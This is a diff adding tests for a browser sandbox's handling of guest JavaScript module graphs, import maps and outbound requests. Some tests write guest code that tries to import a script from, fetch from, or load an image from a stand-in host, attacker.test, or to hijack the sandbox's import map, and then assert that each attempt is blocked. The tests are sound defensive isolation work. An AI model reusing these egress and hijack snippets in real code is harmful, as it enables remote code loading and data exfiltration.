@@ -14,6 +14,8 @@ import { MAX_TOTAL_BYTES, mimeTypeFor } from '@src/lib/files';
  *   7. size: the cap loads in every engine, one byte more is refused on the host
  *   8. markup references: guest markup that names a registered file loads it with parser order intact,
  *      and every other reference fails closed (iframe mode only: worker mode has no markup)
+ *   9. module graph: registered modules import each other by relative path through one import map,
+ *      a module is evaluated once however it is reached, and every unsupported form fails closed
  */
 
 // The NOT_FOUND refusal exactly as guest code sees it: a plain Error with an own code, and a message
@@ -595,5 +597,216 @@ test.describe('8. markup references: guest markup that names a registered file l
             violations: ['img-src https://attacker.test/x.svg', 'img-src https://vfs.invalid:8443/logo.svg'],
         });
         expect(requested.filter(url => !url.includes('attacker'))).toEqual([]);
+    });
+});
+
+test.describe('9. module graph: relative imports between registered modules resolve through one import map (iframe mode)', () => {
+    // A graph across directories: './', '../' and '/' specifiers, export * from, export { } from, a
+    // side-effect import, a literal import(), '..' above the root, and import-like text the rewrite must
+    // not touch. counter.js counts its evaluations: it is reached from markup (by blob: URL) and from
+    // several modules (by virtual URL), and must be evaluated once.
+    const GRAPH: Record<string, FileSpec> = {
+        'app/main.js': [
+            "import { a } from './lib/a.js';",
+            "import { b } from '../shared/b.js';",
+            'import { c } from "/shared/c.js";',
+            "import './side.js';",
+            "export * from './lib/reexport.js';",
+            "export { d } from './lib/d.js';",
+            "globalThis.__mainEvaluations = (globalThis.__mainEvaluations || 0) + 1;",
+            "export const out = a + b + c;",
+            "export const lazy = () => import('./lib/lazy.js').then(m => m.lazy);",
+            "// import './comment.js'",
+            "export const untouched = [\"import './string.js'\", /import '.\\/regex.js'/.source, `import './template.js'`];",
+        ].join('\n'),
+        'app/lib/a.js': "import { b } from '../../shared/b.js'; import '../../shared/counter.js'; export const a = 'a' + b;",
+        'app/lib/reexport.js': "export const re = 're';",
+        'app/lib/d.js': "export const d = 'd';",
+        'app/lib/lazy.js': "import { count } from '/shared/counter.js'; export const lazy = 'lazy' + count;",
+        'app/side.js': "globalThis.__side = (globalThis.__side || 0) + 1;",
+        'app/up.js': "import { b } from '../../../../shared/b.js'; export const up = 'up' + b;",
+        'shared/b.js': "export const b = 'b';",
+        'shared/c.js': "import { count } from './counter.js'; export const c = 'c' + count;",
+        'shared/counter.js': "globalThis.__counterEvaluations = (globalThis.__counterEvaluations || 0) + 1; export const count = globalThis.__counterEvaluations;",
+    };
+
+    const GRAPH_DOCUMENT = `<script>
+            window.__violations = [];
+            addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
+        </script>
+        <script type="module" src="shared/counter.js"></script>
+        <script type="module" src="app/main.js"></script>
+        <script type="module">
+            import { out, re, d, lazy, untouched } from './app/main.js';
+            import { up } from './app/up.js';
+            import { count } from '/shared/counter.js';
+            globalThis.__inline = { out, re, d, lazy: await lazy(), up, count, untouched };
+        </script>`;
+
+    const READ_GRAPH = `
+        for (let i = 0; i < 100 && !globalThis.__inline; i++) await new Promise(res => setTimeout(res, 20));
+        await new Promise(res => setTimeout(res, 100)); // violation events are queued as tasks
+        const viaMarkup = await import(sandboxFiles.url('app/main.js'));
+        return {
+            inline: globalThis.__inline,
+            evaluations: { main: __mainEvaluations, counter: __counterEvaluations, side: __side },
+            sameModule: viaMarkup.out === __inline.out && (await import(sandboxFiles.url('shared/counter.js'))).count === 1,
+            violations: __violations,
+            importMaps: document.querySelectorAll('script[type=importmap]').length,
+            registered: await sandboxFiles.text('app/main.js'),
+            delivered: await (await fetch(sandboxFiles.url('app/main.js'))).text(),
+        };
+    `;
+
+    test('a graph across directories loads from markup <script type=module src> and from an inline module: ./, ../ and / specifiers, export * from, export from, side-effect import, literal import(), .. clamped at the root; a module reached by blob: URL and by virtual URL is evaluated once; no violation', async ({ sandbox }) => {
+        expect(await sandbox.registerFiles(GRAPH)).toBe('ok');
+        expect(await sandbox.mount({ html: GRAPH_DOCUMENT })).toBe('ready');
+        const r = await inGuest(sandbox, READ_GRAPH);
+        expect(r.inline).toEqual({
+            out: 'abbc1', re: 're', d: 'd', lazy: 'lazy1', up: 'upb', count: 1,
+            untouched: ["import './string.js'", "import '.\\/regex.js'", "import './template.js'"],
+        });
+        expect(r.evaluations).toEqual({ main: 1, counter: 1, side: 1 });
+        expect(r.sameModule).toBe(true);
+        expect(r.violations).toEqual([]);
+        // the map was registered and its element removed: the guest document has none
+        expect(r.importMaps).toBe(0);
+        // read()/text() return the file as registered; the URL serves the rewritten module
+        expect(r.registered).toBe(GRAPH['app/main.js']);
+        expect(r.delivered).toContain(`import { a } from "https://vfs.invalid/app/lib/a.js";`);
+        expect(r.delivered).toContain(`import { c } from "https://vfs.invalid/shared/c.js";`);
+        expect(r.delivered).toContain(`import("https://vfs.invalid/app/lib/lazy.js")`);
+        expect(r.delivered).toContain(`// import './comment.js'`);
+    });
+
+    test('unsupported forms fail closed with no request: computed import() of a relative path, new URL(..., import.meta.url), a scheme-relative specifier; a relative import of an unregistered file is refused by the policy', async ({ sandbox }) => {
+        expect(await sandbox.registerFiles({
+            'u/b.js': "export const b = 'b';",
+            'u/computed.js': "const name = 'b.js'; export const r = import('./' + name).then(m => 'loaded:' + m.b, e => 'error:' + e.name);",
+            'u/meta.js': "let r; try { r = new URL('./b.js', import.meta.url).href; } catch (e) { r = 'throws:' + e.name; } export const meta = r; export const metaUrl = import.meta.url.startsWith('blob:null/') ? 'blob:null' : import.meta.url;",
+            'u/scheme-relative.js': "export const r = import('//attacker.test/x.js').then(() => 'loaded', e => 'error:' + e.name);",
+            'u/missing.js': "export const r = import('./not-registered.js').then(() => 'loaded', e => 'error:' + e.name);",
+        })).toBe('ok');
+        expect(await sandbox.mount()).toBe('ready');
+        const r = await inGuest(sandbox, `
+            const violations = [];
+            addEventListener('securitypolicyviolation', e => violations.push(e.effectiveDirective + ' ' + e.blockedURI));
+            const load = (path) => import(sandboxFiles.url(path));
+            const r = {
+                computed: await (await load('u/computed.js')).r,
+                meta: (await load('u/meta.js')).meta,
+                metaUrl: (await load('u/meta.js')).metaUrl,
+                schemeRelative: await (await load('u/scheme-relative.js')).r,
+                missing: await (await load('u/missing.js')).r,
+                schemeRelativeSource: (await (await fetch(sandboxFiles.url('u/scheme-relative.js'))).text()).includes("import('//attacker.test/x.js')"),
+            };
+            await new Promise(res => setTimeout(res, 200)); // violation events are queued as tasks
+            r.violations = [...new Set(violations)].sort();
+            return r;
+        `);
+        expect(r).toEqual({
+            computed: 'error:TypeError',
+            meta: 'throws:TypeError',
+            metaUrl: 'blob:null',
+            schemeRelative: 'error:TypeError',
+            missing: 'error:TypeError',
+            schemeRelativeSource: true,
+            // the only violation is the rewritten import of an unregistered file (positive control for
+            // the violation channel): the other three failed without any request
+            violations: ['script-src-elem https://vfs.invalid/u/not-registered.js'],
+        });
+    });
+
+    test("the guest's own inline import map is merged into ours and taken out of the markup, the same in every engine: its entries apply, ours win on the files' virtual URLs, an invalid map is left out", async ({ sandbox }) => {
+        expect(await sandbox.registerFiles({ 'app/x.js': "export const x = 'ours';" })).toBe('ok');
+        const document = (guestMap: string) => `<script>
+                window.__violations = [];
+                addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
+            </script>
+            <script type="importmap">${guestMap}</script>
+            <script type="module">
+                import { x } from './app/x.js';
+                globalThis.__x = x;
+                globalThis.__cdn = await import('cdn-lib').then(() => 'loaded', e => 'error:' + e.name);
+            </script>`;
+        const read = `
+            for (let i = 0; i < 100 && !globalThis.__cdn; i++) await new Promise(res => setTimeout(res, 20));
+            await new Promise(res => setTimeout(res, 200));
+            return { x: globalThis.__x, cdn: globalThis.__cdn, violations: [...new Set(__violations)].sort(), importMaps: document.querySelectorAll('script[type=importmap]').length };
+        `;
+
+        // A valid guest map, which in Firefox would be ignored if it stayed in the markup after ours.
+        expect(await sandbox.mount({ html: document(JSON.stringify({ imports: {
+            'cdn-lib': 'https://attacker.test/lib.js',
+            'https://vfs.invalid/app/x.js': 'https://attacker.test/hijack.js',
+        } })) })).toBe('ready');
+        expect(await inGuest(sandbox, read)).toEqual({
+            x: 'ours',
+            cdn: 'error:TypeError',
+            // the guest's entry applied (the bare specifier was mapped, then refused by the policy);
+            // its entry for our virtual URL did not (no request for hijack.js)
+            violations: ['script-src-elem https://attacker.test/lib.js'],
+            importMaps: 0,
+        });
+
+        // An invalid guest map is left out; ours still applies, and the bare specifier stays unmapped.
+        expect(await sandbox.load(document('{ not json'))).toBe('ready');
+        expect(await inGuest(sandbox, read)).toEqual({ x: 'ours', cdn: 'error:TypeError', violations: [], importMaps: 0 });
+    });
+
+    test('a module graph adds no egress: modules run under the guest policy, every attempt to reach a non-allowlisted origin is refused AND reported (T5)', async ({ sandbox, context }) => {
+        // Secondary evidence only: in Chromium the route can miss guest requests (backlog T5).
+        const routed: string[] = [];
+        await context.route(/attacker\.test/, (route) => { routed.push(route.request().url()); return route.fulfill({ body: '' }); });
+        expect(await sandbox.registerFiles({
+            'egress/main.js': `import { own } from './own.js';
+                export const outcomes = (async () => ({
+                    own,
+                    import: await import('${'https://attacker.test'}/m.js').then(() => 'reached', () => 'refused'),
+                    fetch: await fetch('https://attacker.test/f').then(() => 'reached', () => 'refused'),
+                    img: await new Promise(res => { const i = new Image(); i.onload = () => res('reached'); i.onerror = () => res('refused'); i.src = 'https://attacker.test/i.png'; }),
+                }))();`,
+            'egress/own.js': "export const own = 'reached';",
+        })).toBe('ok');
+        expect(await sandbox.mount({ html: `<script>
+                window.__violations = [];
+                addEventListener('securitypolicyviolation', e => __violations.push(e.effectiveDirective + ' ' + e.blockedURI));
+            </script>
+            <script type="module">import { outcomes } from './egress/main.js'; globalThis.__outcomes = await outcomes;</script>` })).toBe('ready');
+        const r = await inGuest(sandbox, `
+            for (let i = 0; i < 100 && !globalThis.__outcomes; i++) await new Promise(res => setTimeout(res, 20));
+            await new Promise(res => setTimeout(res, 300));
+            return { outcomes: globalThis.__outcomes, violations: [...new Set(__violations)].sort() };
+        `);
+        // positive control for the outcome channel: the graph's own import is reached
+        expect(r.outcomes).toEqual({ own: 'reached', import: 'refused', fetch: 'refused', img: 'refused' });
+        // every refusal has its violation, so a request that left and merely failed would show up here
+        expect(r.violations).toEqual([
+            'connect-src https://attacker.test/f',
+            'img-src https://attacker.test/i.png',
+            'script-src-elem https://attacker.test/m.js',
+        ]);
+        expect(routed).toEqual([]);
+    });
+
+    test('worker mode is classic only: importScripts and read() work as before, read() returns the file as registered, and a rewritten module graph fails closed (no import map in workers)', async ({ sandbox }) => {
+        const main = "import { b } from './b.js'; export const out = b;";
+        expect(await sandbox.registerFiles({
+            'w/classic.js': "globalThis.__classic = 'ran';",
+            'w/main.js': main,
+            'w/b.js': "export const b = 'b';",
+        })).toBe('ok');
+        expect(await sandbox.mount({ mode: 'worker' })).toBe('ready');
+        const r = await inGuest(sandbox, `
+            importScripts(sandboxFiles.url('w/classic.js'));
+            return {
+                scope: typeof document === 'undefined' ? 'worker' : 'document',
+                classic: globalThis.__classic,
+                leaf: (await import(sandboxFiles.url('w/b.js'))).b,
+                graph: await import(sandboxFiles.url('w/main.js')).then(m => 'loaded:' + m.out, e => 'error:' + e.name),
+                registered: await sandboxFiles.text('w/main.js'),
+            };
+        `);
+        expect(r).toEqual({ scope: 'worker', classic: 'ran', leaf: 'b', graph: 'error:TypeError', registered: main });
     });
 });
